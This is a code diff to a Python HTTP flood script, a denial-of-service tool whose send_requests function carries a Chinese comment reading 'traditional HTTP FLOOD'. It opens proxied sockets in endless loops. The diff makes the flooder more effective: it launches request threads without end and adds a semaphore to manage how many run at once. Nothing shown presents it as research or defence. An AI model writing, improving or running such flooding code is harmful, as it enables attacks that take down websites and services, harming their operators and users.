@@ -362,7 +362,8 @@ def joinThreads():
 
 
 def launchThreads():
-    for _ in range(thr):
+    threading.Thread(target=joinThreads, daemon=True).start()
+    while 1:
         try:
             if version == "http":
                 t = threading.Thread(target=send_requests)
@@ -435,6 +436,7 @@ def send_requests(): #傳統HTTP FLOOD
     else:
         header = headerHandle()
     header += f'\r\n'
+    sema.acquire()
     while 1:
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -456,6 +458,7 @@ def send_requests(): #傳統HTTP FLOOD
                 s.close()
         except:
             s.close()
+    sema.release()
     return
 
 
@@ -487,6 +490,7 @@ if __name__ == '__main__':
                 thr = 800
             else:
                 thr = thr
+            sema = threading.Semaphore(thr)
             path = str(sys.argv[5])
             version = str(sys.argv[6])
         except Exception as e:
